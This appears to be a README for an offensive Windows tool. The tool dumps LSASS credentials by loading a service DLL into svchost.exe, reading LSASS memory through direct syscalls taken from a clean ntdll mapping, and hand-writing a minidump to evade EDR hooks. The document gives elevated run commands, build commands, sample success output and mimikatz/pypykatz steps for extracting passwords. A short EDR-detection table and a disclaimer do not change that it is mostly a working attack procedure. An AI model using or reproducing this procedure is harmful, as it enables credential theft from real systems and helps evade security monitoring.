# ServiceSyscallDump — LSASS Dump via svchost.exe Service DLL + Direct Syscalls

> Dump LSASS credentials by injecting a service DLL into `svchost.exe`, opening LSASS (trusted process exemption), then reading all memory regions via **direct syscalls** (`NtReadVirtualMemory`) and writing a **manual MDMP file** — bypassing both handle protections and user-mode API hooks.

---

## How It Works

This technique combines two evasion layers:

1. **svchost.exe trusted process exemption** — The DLL runs inside `svchost.exe`, which is typically allowlisted by EDR kernel callbacks. This grants a full-access handle to LSASS without triggering `ObRegisterCallbacks` restrictions.

2. **Direct syscall + manual MDMP writer** — Instead of calling hooked APIs like `MiniDumpWriteDump` or `NtReadVirtualMemory`, the DLL maps a **clean copy of ntdll.dll from disk**, extracts the System Service Number (SSN) for `NtReadVirtualMemory`, builds a raw `syscall` stub in executable memory, and uses it to read LSASS memory directly. The dump is written in MDMP format manually — no dependency on `dbghelp.dll`.

```
┌─────────────────┐    creates     ┌──────────────────────────────────┐
│ SvchostLoader    │───registry───>│ HKLM\Services\CredDumpSvc        │
│ (admin console)  │   + group     │   Type=0x20 (SHARE_PROCESS)      │
│                  │               │   Parameters\ServiceDll=our.dll  │
└────────┬────────┘               └──────────────────────────────────┘
         │ starts via SCM
         ▼
┌────────────────────────────────┐ OpenProcess  ┌───────────┐
│ svchost.exe -k CredDiagGroup   │────────────>│ lsass.exe  │
│  └─ SvcSyscallDll.dll          │  (trusted!)  │  PID 908   │
│     ServiceMain()              │              └───────────┘
│       │                        │
│       │ 1. Map clean ntdll.dll │
│       │ 2. Parse SSN for       │
│       │    NtReadVirtualMemory │
│       │ 3. Build syscall stub: │
│       │    mov r10,rcx         │
│       │    mov eax, SSN        │
│       │    syscall / ret       │
│       │                        │
│       │ 4. VirtualQueryEx      │
│       │    → enumerate regions │
│       │                        │
│       │ 5. Direct syscall      │
│       │    NtReadVirtualMemory │
│       │    → read each region  │
│       │                        │
│       │ 6. Manual MDMP writer  │
│       ▼                        │
│     lsass.dmp written          │
│     Service self-stops         │
└────────────────────────────────┘
```

### Why Direct Syscalls?

EDRs commonly hook `ntdll.dll` in user-mode to intercept API calls like `NtReadVirtualMemory`. By mapping a fresh copy of `ntdll.dll` from `C:\Windows\System32\ntdll.dll` as raw file data (not a DLL load), parsing the export table for the SSN, and building a `syscall` instruction directly, the DLL executes the system call **without ever touching the hooked ntdll in memory**.

### Why Manual MDMP?

`MiniDumpWriteDump` from `dbghelp.dll` is a well-known credential dumping indicator. This technique writes the MDMP header, stream directory, system info, and Memory64List entries manually — producing a file that is fully compatible with WinDbg and mimikatz, without ever calling `MiniDumpWriteDump`.

---

## Usage

### Step 1 — Reconnaissance

Open an **elevated** (Administrator) command prompt:

```
SvchostLoader.exe --recon
```

Output:
```
=== ServiceSyscallDump Recon ===

[*] Technique: Register DLL as svchost.exe-hosted service
[*] DLL reads LSASS via direct syscalls, writes manual MDMP

[+] Running as Administrator: YES
[+] SeDebugPrivilege: Available
[+] SCM full access: YES
[+] Svchost groups registry writable: YES
[*] Service 'CredDumpSvc' exists: No (clean)

[*] Attack flow:
    1. Loader creates service registry entries for svchost-hosted DLL
    2. Loader adds svchost group, starts service via SCM
    3. SCM spawns: svchost.exe -k CredDiagGroup
    4. svchost.exe loads our DLL, calls ServiceMain
    5. DLL opens LSASS (svchost.exe is typically trusted by EDRs)
    6. DLL maps clean ntdll.dll from disk, resolves SSN
    7. VirtualQueryEx enumerates LSASS memory regions
    8. Direct syscall NtReadVirtualMemory reads all regions
    9. Manual MDMP writer produces WinDbg/mimikatz-compatible dump

[+] All prerequisites met — technique should work!
```

<!-- Screenshot: SvchostLoader.exe --recon output -->

### Step 2 — Execute the Dump

```
SvchostLoader.exe --dump --out C:\Windows\Temp\debug.dmp --dll C:\path\to\SvcSyscallDll.dll
```

Output:
```
=== ServiceSyscallDump — svchost.exe Service DLL + Direct Syscalls ===

[*] DLL:  C:\path\to\SvcSyscallDll.dll
[*] Dump: C:\Windows\Temp\debug.dmp

[+] SeDebugPrivilege enabled
[*] Creating service registry entries...
[+] Service registry created: CredDumpSvc
[+] Svchost group registered: CredDiagGroup
[*] Starting service via Service Control Manager...
[+] Service created in SCM
[+] Service started — svchost.exe is loading our DLL!
[*] svchost.exe will open LSASS with PROCESS_ALL_ACCESS
[*] DLL will read LSASS memory via direct syscalls and write MDMP
[*] Waiting for dump to complete...
[+] Service stopped (completed)

--- Service Log ---
[*] ================================================================
[*]  SvcSyscallDll — Direct Syscall LSASS Dump via svchost.exe
[*]  svchost.exe PID 12345
[*]  Output: C:\Windows\Temp\debug.dmp
[*] ================================================================
[+] LSASS PID: 908
[+] Clean ntdll.dll mapped from disk (raw file data)
[*] NtReadVirtualMemory SSN = 63 (0x003F) OK
[+] Direct syscall stub ready
[*] Step 1: OpenProcess(LSASS) via svchost.exe exemption
[+] LSASS handle 0x000001A0 — PROCESS_ALL_ACCESS
[*] Step 2: VirtualQueryEx + NtReadVirtualMemory (syscall SSN=0x003F) + MDMP writer
[*] Regions: 387
[*] Total: 59410432 bytes (56.7 MB)
[+] MDMP written: 59410432 bytes, 381/387 regions OK
[+] File 59432960 bytes - SUCCESS
[+] === LSASS DUMP SUCCESSFUL ===
--- End Log ---

[+] LSASS DUMP SUCCESSFUL!
[+] Dump file: C:\Windows\Temp\debug.dmp
[+] Dump size: 59432960 bytes (56.68 MB)

[+] Technique: svchost.exe service DLL + direct syscall memory read

[*] Auto-cleaning up service entries...
[+] Service deleted from SCM
[+] Service registry keys deleted
[+] Svchost group entry deleted
[+] Cleanup complete
```

<!-- Screenshot: SvchostLoader.exe --dump output -->

### Step 3 — Manual Cleanup (if needed)

If the loader crashes or you Ctrl+C during execution:

```
SvchostLoader.exe --cleanup
```

### Step 4 — Parse the Dump

```
mimikatz # sekurlsa::minidump C:\Windows\Temp\debug.dmp
mimikatz # sekurlsa::logonpasswords
```

Or with pypykatz:
```
pypykatz lsa minidump C:\Windows\Temp\debug.dmp
```

<!-- Screenshot: Credential extraction from the dump -->

---

## Build

### MinGW (x86_64)

```bash
# Service DLL (loaded by svchost.exe) — NO dbghelp dependency!
x86_64-w64-mingw32-g++ -shared -o SvcSyscallDll.dll SvcSyscallDll.cpp \
    -ladvapi32 -lntdll -static -static-libgcc -static-libstdc++

# Loader (registers service, starts it, monitors)
x86_64-w64-mingw32-g++ -o SvchostLoader.exe SvchostLoader.cpp \
    -ladvapi32 -static
```

### MSVC

```bash
# Service DLL
cl /LD /EHsc SvcSyscallDll.cpp /link advapi32.lib ntdll.lib

# Loader
cl /EHsc SvchostLoader.cpp /link advapi32.lib
```

> **Note:** This technique does NOT link against `dbghelp.dll` — the MDMP file is written manually. This eliminates the `MiniDumpWriteDump` detection surface entirely.

---

## How EDRs Can Detect This

| Detection Vector | Description |
|---|---|
| **New svchost service group** | Creating a new service group under `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Svchost` is unusual. Registry monitoring (Sysmon Event ID 12/13) can flag this. |
| **`SERVICE_WIN32_SHARE_PROCESS` with unknown DLL** | A new service of type 0x20 pointing to an unsigned/unknown DLL is suspicious. Service creation events (Event ID 7045) should be monitored. |
| **Clean ntdll.dll mapping** | Mapping `ntdll.dll` as a file (not a DLL load) is a known technique to resolve unhooked syscall stubs. File I/O monitoring on `ntdll.dll` reads can flag this. |
| **`VirtualQueryEx` on LSASS** | Enumerating memory regions of LSASS is a strong signal. While some tools do this legitimately, the combination with other indicators is suspicious. |
| **Direct syscall execution** | The `syscall` instruction executed from a `VirtualAlloc`'d region (not ntdll.dll) can be detected via kernel-mode stack analysis — the return address will be in a non-image region. |
| **MDMP file signature** | Monitoring for files with the `MDMP` magic bytes (`0x504D444D`) being written, especially by svchost.exe, is a reliable detection. |
| **Short-lived svchost.exe instance** | A `svchost.exe` process that starts and stops within seconds is behaviorally suspicious. Process lifetime analysis can catch this. |
| **Service registry auto-cleanup** | The immediate deletion of service registry entries after execution is a cleanup pattern associated with attack tools. |

---

## MITRE ATT&CK

| ID | Technique |
|---|---|
| T1003.001 | OS Credential Dumping: LSASS Memory |
| T1543.003 | Create or Modify System Process: Windows Service |
| T1106 | Native API |
| T1562.001 | Impair Defenses: Disable or Modify Tools (syscall unhooking) |

---

## Files

```
ServiceSyscallDump/
├── README.md
├── native/
│   ├── SvcSyscallDll.cpp      # Service DLL (direct syscall + manual MDMP)
│   └── SvchostLoader.cpp      # Loader (registers & starts the service)
└── bin/
    ├── SvcSyscallDll.dll      # Pre-built DLL (x64)
    └── SvchostLoader.exe      # Pre-built loader (x64)
```

---

## Requirements

- Windows 10/11 (x64)
- Administrator privileges (SeDebugPrivilege)
- Service Control Manager access
- LSASS must not be running as PPL (Protected Process Light) — or you need a PPL bypass

---

## References

- [Direct Syscalls](https://outflank.nl/blog/2019/06/19/red-team-tactics-combining-direct-system-calls-and-srdi-to-bypass-av-edr/) — Outflank's blog on direct system call technique
- [SysWhispers](https://github.com/jthuraisamy/SysWhispers) — SSN resolution and syscall stub generation
- [ObRegisterCallbacks](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-obregistercallbacks) — Kernel mechanism used by EDRs to protect LSASS

---

> **Disclaimer:** This tool is intended for authorized security testing and research only. Unauthorized credential dumping is illegal. Use responsibly.
